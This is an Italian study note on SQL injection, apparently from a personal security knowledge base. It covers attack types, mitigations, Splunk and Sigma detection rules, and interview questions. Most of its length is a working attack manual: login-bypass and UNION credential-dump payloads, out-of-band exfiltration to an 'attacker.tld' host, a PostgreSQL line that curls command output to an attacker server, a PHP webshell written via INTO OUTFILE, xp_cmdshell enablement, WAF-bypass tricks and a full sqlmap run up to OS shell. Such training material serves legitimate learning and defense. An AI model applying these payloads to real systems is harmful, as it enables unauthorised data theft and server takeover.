---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 7
aggiornato: 2026-07-02
stato: maturo
aliases: ["SQL Injection", "SQLi", "Injection"]
---

# SQL Injection

> **Nota etica**: le tecniche qui descritte vanno praticate solo su ambienti autorizzati ([[PortSwigger Web Academy]], DVWA, TryHackMe, CTF). Usarle su sistemi reali senza permesso scritto è reato.

## In breve
La **SQL Injection** (SQLi) sfrutta query costruite **concatenando input non sanificato**: l'attaccante chiude la stringa originale e inietta SQL proprio. Categoria **A03 - Injection** dell'[[OWASP Top 10]]. Impatto: bypass di autenticazione, lettura/scrittura arbitraria del DB, in alcuni casi **RCE** sul server DB. La radice è sempre la stessa: **dato e codice mescolati nella stessa stringa** — la stessa primitiva della [[Command Injection]] (shell) e di altre injection (LDAP, XPath, NoSQL).

> [!note] Numerazione OWASP 2025
> Nella bozza **OWASP Top 10:2025** la categoria Injection scende a **A05** e **ingloba anche l'[[Cross-Site Scripting (XSS)]]** (injection lato client). La radice comune resta "mescolare canale di controllo e canale dati".

> [!example] CVE storici di expression/command injection
> - **CVE-2017-5638** (Apache Struts 2, OGNL injection) — RCE via header `Content-Type` malformato: è la falla sfruttata nel **breach Equifax 2017** (147M record).
> - **CVE-2012-1823** (PHP-CGI) — argument injection che permette esecuzione di codice.

## Come funziona
Codice vulnerabile tipico (la query è una stringa costruita a runtime):
```python
query = "SELECT * FROM utenti WHERE username='" + user + "' AND password='" + pwd + "'"
```
Se `user = admin'-- ` l'input non resta un *dato*: diventa **parte della sintassi**. Il `'` chiude la stringa, il resto è interpretato come SQL.

### Dove cercarla (entry point)
Non solo i form di login: qualunque input che finisce in una query — parametri GET/POST, **header** (`User-Agent`, `Referer`, `X-Forwarded-For`), **cookie**, campi JSON, ordinamento (`?sort=`), filtri. Primo test non distruttivo: inserire un apice `'` e osservare errore 500 / comportamento anomalo, poi `''` (due apici) per confermare che l'errore sparisce.

## I 5 tipi (e come riconoscerli)
| Tipo | Quando si usa | Segnale |
|---|---|---|
| **In-band / UNION-based** | l'output della query è visibile in pagina | puoi aggiungere righe con `UNION` |
| **Error-based** | il DB stampa i messaggi d'errore | estrai dati *dentro* l'errore |
| **Blind boolean-based** | nessun output né errore, ma la pagina **cambia** (vero/falso) | risposta diversa con `AND 1=1` vs `AND 1=2` |
| **Blind time-based** | nessuna differenza visibile | inietti un `SLEEP` e misuri il ritardo |
| **Out-of-band (OOB)** | nessun canale diretto | esfiltri via **DNS/HTTP** verso un server tuo |

## Esempio 1 — Bypass autenticazione (e perché un payload "classico" NON funziona)
Query: `SELECT * FROM utenti WHERE username='$user' AND password='$pass'`

> [!warning] Errore comune
> Il payload `' OR '1'='1` da solo **non basta**. Per precedenza `AND` lega più di `OR`, quindi:
> `username='' OR ('1'='1' AND password='')` → la parte `AND` è falsa, resta `username=''` → **login fallito**.

Il modo corretto è **commentare via** il resto della query. Username = `admin'-- ` (nota lo **spazio** dopo `--`):
```sql
SELECT * FROM utenti WHERE username='admin'-- ' AND password='...'
```
Tutto dopo `-- ` è commento: autentichi come `admin` senza password. Varianti commento per DB: `-- ` (standard/MSSQL/Postgres), `#` (MySQL), `/*...*/` (inline).

## Esempio 2 — UNION-based (esfiltrare dati)
Procedura completa, passo per passo.

**1. Conta le colonne** (la `UNION` richiede stesso numero di colonne). Due metodi:
```sql
' ORDER BY 1--      ' ORDER BY 2--   ...  (incrementa finché dà errore → n = ultimo valore valido)
' UNION SELECT NULL--          ' UNION SELECT NULL,NULL--   ...  (finché smette di errorare)
```
**2. Trova una colonna che renderizza stringhe**:
```sql
' UNION SELECT 'a',NULL,NULL--      (prova ogni posizione finché vedi 'a' in pagina)
```
**3. Fingerprint del DB** (versione → dialetto):
```sql
' UNION SELECT @@version, NULL--          -- MySQL / MSSQL
' UNION SELECT version(), NULL--          -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--  -- Oracle
```
**4. Enumera schema** via `information_schema` (MySQL/MSSQL/Postgres):
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
**5. Dump credenziali** (concatenazione dipende dal DB):
```sql
' UNION SELECT username || '~' || password, NULL FROM users--   -- Postgres/Oracle ( || )
' UNION SELECT CONCAT(username,0x7e,password), NULL FROM users-- -- MySQL ( CONCAT )
```

## Esempio 3 — Blind boolean-based
Nessun output: la pagina dice solo "benvenuto" (vero) o niente (falso). Si estrae **un carattere alla volta**:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```
Se la risposta è "vero", il 1° carattere è `a`. Si itera posizione e carattere (automatizzabile con [[Burp Suite]] Intruder o [[sqlmap]]).

## Esempio 4 — Blind time-based
La pagina non cambia mai: si inietta un ritardo condizionale e si **cronometra**.
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--          -- MSSQL
' AND IF(1=1, SLEEP(5), 0)--                 -- MySQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  -- PostgreSQL
```
Se la risposta arriva dopo ~5s, la condizione è vera → si estrae dato bit a bit.

## Esempio 5 — Out-of-band (OOB)
Quando non c'è alcun canale, si forza il DB a fare una richiesta DNS/HTTP verso un dominio controllato (Burp Collaborator):
```sql
'; exec master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.attacker.tld\x'--  -- MSSQL
' UNION SELECT UTL_INADDR.get_host_address((SELECT password FROM users)||'.attacker.tld') FROM dual--  -- Oracle
```
Il valore segreto appare nel **sottodominio** della query DNS ricevuta.

> [!tip] Second-order SQLi
> L'input viene salvato "pulito" e iniettato **dopo**, quando una *seconda* query lo riusa (es. username registrato `admin'--` riusato in un UPDATE). I filtri all'ingresso non bastano: serve parametrizzare **ogni** query.

## Mitigazione e difesa (in ordine di efficacia)
1. **Prepared statement / query parametrizzate** — la difesa vera. Dato e codice separati a livello di driver:
   ```python
   cur.execute("SELECT * FROM utenti WHERE username=%s AND password=%s", (user, pwd))
   ```
   ```php
   $stmt = $pdo->prepare("SELECT * FROM utenti WHERE username = ?");
   $stmt->execute([$user]);
   ```
2. **ORM** ben usati (SQLAlchemy, Hibernate, Eloquent) — parametrizzano in automatico, ma `raw()` ricrea il buco.
3. **Allowlist per gli identificatori**: nomi di tabella/colonna e direzione `ORDER BY` **non** sono parametrizzabili → validali contro una lista chiusa.
4. **Least privilege** sul DB user: niente `DROP`/`FILE`, account separato per app → limita il danno.
5. **WAF** come strato extra, **non** come difesa primaria (i bypass — commenti, encoding, case — sono noti).
6. L'**escaping manuale** e la "sanitizzazione" da soli **non bastano** e si aggirano.

## Lab consigliati
- PortSwigger: *SQLi UNION attacks*, *Blind SQLi (conditional / time delays)*, *SQLi in different contexts*.
- TryHackMe: *SQL Injection*, *SQLMap*. DVWA livelli low→high.

---

# Approfondimento operativo (livello esperto)

## Meccanismo interno
Cosa succede *dentro* il DB spiega perché certi payload funzionano:

- **Parsing vs binding.** Una query passa per **lexer → parser → planner → executor**. In una query concatenata l'input attraversa **tutte** queste fasi come testo: il `'` cambia l'albero sintattico (AST) prodotto dal parser. In un **prepared statement** il parser produce l'AST *prima* del binding: i `?`/`%s` sono nodi-placeholder già tipizzati, il valore viene legato all'executor e **non può** modificare l'AST. Questo è il motivo strutturale per cui la parametrizzazione è immune, non un filtro.
- **Coercizione di tipo.** In MySQL una stringa in contesto numerico viene castata: `'1abc'` → `1`, `'abc'` → `0`. Da qui i bypass tipo `OR 1` senza apici in colonne numeriche.
- **Precedenza degli operatori** (vedi Esempio 1): `AND` lega più di `OR`; `NOT` più di `AND`. I payload di auth-bypass commentano via il resto proprio per non dipendere dalla precedenza.
- **Short-circuit.** `IF(cond, SLEEP(5), 0)` ed `CASE WHEN` valutano il ramo solo se la condizione è vera: è ciò che rende misurabile il blind time-based.
- **Stacked queries.** `; SELECT ...` esegue una **seconda** istruzione. Funziona solo se il driver lo consente: **MSSQL (`SqlClient`) e PostgreSQL sì**; **MySQL via PHP `mysqli_query()`/PDO default no** (una chiamata = una query). Determinante per `xp_cmdshell` e per molte RCE.

## WAF bypass sistematico
Un WAF fa pattern-matching su signature (`UNION SELECT`, `OR 1=1`, `--`). Si aggira spezzando la signature senza cambiare la semantica SQL. Una tecnica per categoria:

| Tecnica | Esempio (la signature non matcha, l'SQL sì) |
|---|---|
| **Commenti inline** | `UN/**/ION SE/**/LECT` · `/*!50000UNION*/ /*!50000SELECT*/` (versioned comment MySQL: il codice gira solo se versione ≥ 5.00.00) |
| **Case mixing** | `uNiOn sElEcT` (contro regex case-sensitive) |
| **Whitespace alternativo** | `UNION%0aSELECT` (newline), `%09` (tab), `%0c`, `%a0`; oppure `UNION(SELECT(1))` senza spazi |
| **Encoding** | URL doppio: `%2553` → `%53` → `S`; hex per stringhe: `0x61646d696e` = `'admin'`; `CHAR(97,100,109,105,110)` |
| **Keyword splitting / nesting** | `1 AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(...)x FROM ...)a)` annida sottoquery dove il filtro non guarda |
| **Operatori equivalenti** | `OR 1=1` → `OR 2>1`, `OR 'a'='a'`, `OR 1 LIKE 1`, `||` al posto di `OR` (se `PIPES_AS_CONCAT` off) |
| **Parametri duplicati / HPP** | `?id=1&id=2 UNION SELECT...` — alcuni WAF ispezionano la **prima** occorrenza, il backend usa l'**ultima** (PHP) o le concatena (ASP `id=1,2`) |
| **Chunked / null byte / charset** | `Transfer-Encoding: chunked` per spezzare il body fuori dalla view del WAF; switch charset (`SET CHARACTER SET`) per ottenere bypass multibyte (`%bf%27`) |

> [!tip] Ordine di prova
> Parti dal più economico: case + commenti inline + whitespace alternativo coprono la maggioranza dei WAF di base. Encoding e HPP per quelli configurati meglio. `sqlmap --tamper` (sotto) automatizza queste trasformazioni.

## Da SQLi a RCE — file e comandi
La SQLi è anche un primitivo di **lettura/scrittura file** e talvolta **esecuzione comandi**. Dipende dal DBMS e dai privilegi.

**MSSQL — `xp_cmdshell`** (richiede stacked query + privilegi `sysadmin`):
```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'--
```
Lettura file MSSQL: `OPENROWSET(BULK 'C:\path', SINGLE_CLOB)`. Spesso si pivota verso una [[Reverse Shell e Bind Shell]] PowerShell.

**MySQL — `INTO OUTFILE` / `LOAD_FILE`** (richiede `FILE` privilege e `secure_file_priv` permissivo):
```sql
-- scrivere una webshell (se conosci la docroot e hai permesso di scrittura)
' UNION SELECT "<?php system($_GET['c']); ?>",NULL INTO OUTFILE '/var/www/html/sh.php'--
-- leggere un file
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
```
> [!warning] `secure_file_priv`
> Dal default moderno di MySQL `secure_file_priv` punta a una cartella isolata (o è vuoto = disabilitato): `INTO OUTFILE` verso la docroot **fallisce**. Verifica con `SELECT @@secure_file_priv`. Non assumere che la webshell scriva.

**PostgreSQL — `COPY ... FROM/TO PROGRAM`** (richiede ruolo con privilegio adeguato, ≥ 9.3):
```sql
-- esecuzione comando via COPY ... FROM PROGRAM
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/o; curl http://attacker/$(cat /tmp/o|base64)'--
-- lettura file in tabella
'; CREATE TABLE x(d text); COPY x FROM '/etc/passwd'--
```
Postgres ha anche RCE via estensioni (`CREATE FUNCTION ... LANGUAGE C`) se superuser.

**Tabella sintetica file/RCE:**

| DBMS | Leggi file | Scrivi file | Comando OS |
|---|---|---|---|
| MySQL | `LOAD_FILE()` | `INTO OUTFILE`/`DUMPFILE` | UDF custom (raro) |
| MSSQL | `OPENROWSET BULK` | `OLE Automation` / `bcp` | `xp_cmdshell` |
| PostgreSQL | `COPY FROM` / `pg_read_file()` | `COPY TO` / `lo_export` | `COPY ... TO PROGRAM` |
| Oracle | `UTL_FILE` | `UTL_FILE` | `DBMS_SCHEDULER`, Java |

## Walkthrough end-to-end — sqlmap completo
Caso: parametro `id` GET su un'app sospetta, blind, dietro WAF.

```bash
# 1. Cattura una richiesta autentica (Burp → Save item) e dalla a sqlmap: header/cookie reali
sqlmap -r req.txt -p id --batch

# 2. Alza profondità: --level testa anche header/cookie, --risk abilita payload più aggressivi
#    level 1-5 (default 1 → solo GET/POST). risk 1-3 (default 1; 3 include OR-based, rischiosi)
sqlmap -r req.txt -p id --level=5 --risk=3 --batch

# 3. WAF? Identificalo e applica tamper (uno o più, in pipeline)
sqlmap -r req.txt --identify-waf
sqlmap -r req.txt -p id --tamper=space2comment,charencode,randomcase --level=5 --risk=3

# 4. Forza tecnica e DBMS se l'autodetect fatica; rallenta per stare sotto rate-limit
sqlmap -r req.txt -p id --technique=BT --dbms=mysql --time-sec=2 --delay=1 --randomize=...

# 5. Enumerazione progressiva
sqlmap -r req.txt -p id --dbs                          # database
sqlmap -r req.txt -p id -D appdb --tables
sqlmap -r req.txt -p id -D appdb -T users --columns
sqlmap -r req.txt -p id -D appdb -T users -C user,pass --dump

# 6. Escalation: shell SQL, shell OS, lettura file
sqlmap -r req.txt -p id --sql-shell                    # query interattive
sqlmap -r req.txt -p id --os-shell                     # tenta webshell/xp_cmdshell → shell OS
sqlmap -r req.txt -p id --file-read=/etc/passwd
sqlmap -r req.txt -p id --file-write=sh.php --file-dest=/var/www/html/sh.php
```
Tamper utili: `space2comment`, `between` (rimpiazza `>`/`=`), `charencode`, `charunicodeencode`, `randomcase`, `apostrophemask`, `modsecurityversioned`, `equaltolike`, `space2hash` (MySQL), `versionedmorekeywords`.

## Detection engineering
**Sorgenti log.** Access log del web server (parametri in chiaro nei GET), log applicativo, **error log del DB** (sintassi non valida = SQLi tentata), e — il più affidabile — **DB audit log** che cattura la query *finale* eseguita.

**Cosa cercare** (alta fedeltà): `UNION SELECT`, `information_schema`, `SLEEP(`/`pg_sleep`/`WAITFOR DELAY`, `xp_cmdshell`, `INTO OUTFILE`, `0x` lunghi, sequenze di apici/commenti, errori SQL ricorrenti dallo stesso IP.

**Query SIEM (Splunk, su access log):**
```spl
index=web sourcetype=access_combined
| eval ua=urldecode(uri_query)
| search ua IN ("*union*select*","*information_schema*","*sleep(*","*waitfor*delay*","*xp_cmdshell*")
| stats count, dc(uri_path) as paths by src_ip
| where count > 5
```
**Regola Sigma (web proxy):**
```yaml
title: Tentativo di SQL Injection in URI
logsource: { category: webserver }
detection:
  sel_keywords:
    cs-uri-query|contains|all:
      - 'union'
      - 'select'
  sel_blind:
    cs-uri-query|contains:
      - 'sleep('
      - 'waitfor delay'
      - 'pg_sleep'
      - 'benchmark('
  condition: sel_keywords or sel_blind
falsepositives: [ ricerche full-text legittime con la parola "select" ]
level: high
```
**MITRE ATT&CK:** **T1190** — Exploit Public-Facing Application (initial access). Se segue webshell: **T1505.003** (Web Shell); se `xp_cmdshell`/`COPY PROGRAM`: **T1059** (Command and Scripting Interpreter).

> [!note] Difesa rilevamento
> Time-based blind genera pochi log "rumorosi" ma molte richieste quasi identiche con latenza anomala: una regola su **deviazione di response-time per stesso URI/IP** lo cattura meglio delle signature.

## Troubleshooting (5 errori comuni)
1. **UNION dà sempre errore** → numero colonne sbagliato *o* tipi incompatibili. Conta con `ORDER BY n`; metti `NULL` in ogni posizione (NULL è compatibile con ogni tipo), poi sostituisci una sola colonna con la stringa.
2. **Il commento `--` non chiude la query** → in MySQL `--` richiede uno **spazio dopo** (`-- ` o `-- -`); usa `#` o `/*...*/`. In URL lo spazio va come `+` o `%20`, il `#` come `%23` (altrimenti il browser lo tratta da fragment).
3. **`INTO OUTFILE` fallisce con permission denied** → `secure_file_priv` o privilegio `FILE` mancante, o docroot non scrivibile dall'utente del DB. Verifica `@@secure_file_priv` prima di insistere.
4. **Time-based non ritarda / ritarda a caso** → query in cache, connection pool, o condizione mai vera. Testa prima `SLEEP(5)` incondizionato per provare il canale, poi rendilo condizionale.
5. **sqlmap dice "not injectable" ma a mano funziona** → manca `--level/--risk`, o il punto d'iniezione è in header/cookie/JSON non testato di default; passa `-r` con la richiesta reale, indica `-p`, aggiungi `--tamper` se c'è un WAF, marca il punto con `*` nel file richiesta.

## Domande da colloquio
**D: Perché i prepared statement fermano la SQLi mentre l'escaping no?**
R: Il prepared statement separa *parsing* e *binding*: il DBMS compila la query con placeholder prima di vedere i dati, quindi l'input non può cambiare l'AST. L'escaping resta una manipolazione di stringa, fallibile per contesti non previsti (numerici, multibyte, second-order).

**D: Hai una SQLi blind senza output né errori. Come confermi e poi estrai dati?**
R: Confermo col canale time-based (`SLEEP`/`WAITFOR`/`pg_sleep` condizionale) o boolean (differenza di risposta `AND 1=1` vs `1=2`). Estraggo carattere per carattere con `SUBSTRING` + confronto, idealmente con ricerca binaria sui code-point per ridurre le richieste; automatizzo con sqlmap o Intruder.

**D: Quando una SQLi diventa RCE?**
R: Quando il DBMS espone primitivi OS e i privilegi lo consentono: `xp_cmdshell` su MSSQL (sysadmin + stacked query), `COPY ... TO PROGRAM` su Postgres (superuser-like), webshell via `INTO OUTFILE` su MySQL (FILE + `secure_file_priv` permissivo + docroot nota e scrivibile).

**D: Differenza tra in-band, blind e out-of-band?**
R: In-band restituisce i dati sullo stesso canale della richiesta (UNION/error). Blind non dà dati diretti: si inferiscono da differenze booleane o temporali. Out-of-band li esfiltra su un canale separato (DNS/HTTP) e serve quando non c'è alcun feedback in-band.

## Collegamenti
- [[OWASP Top 10]]
- [[Autenticazione e Gestione Sessioni]] — il bypass login è una conseguenza diretta
- [[Cookie e JWT]] — i cookie sono un entry point spesso dimenticato
- [[Command Injection]] — stessa radice (dato trattato come codice)
- [[Burp Suite]] — Repeater/Intruder per blind e UNION
- [[sqlmap]] — automazione di tutte le tecniche sopra
- [[PortSwigger Web Academy]]
- [[Reverse Shell e Bind Shell]] — pivot dopo `xp_cmdshell`/`COPY PROGRAM`
- [[Command Injection]] — stessa primitiva RCE per altra via

## Fonti
- PortSwigger — SQL injection: https://portswigger.net/web-security/sql-injection
- PortSwigger — SQLi cheat sheet (payload per DB): https://portswigger.net/web-security/sql-injection/cheat-sheet
- OWASP — SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP — SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- sqlmap — manuale utente (opzioni, tamper): https://github.com/sqlmapproject/sqlmap/wiki/Usage
- HackTricks — SQL Injection (file/RCE, WAF bypass): https://book.hacktricks.xyz/pentesting-web/sql-injection
- MITRE ATT&CK — T1190 Exploit Public-Facing Application: https://attack.mitre.org/techniques/T1190/
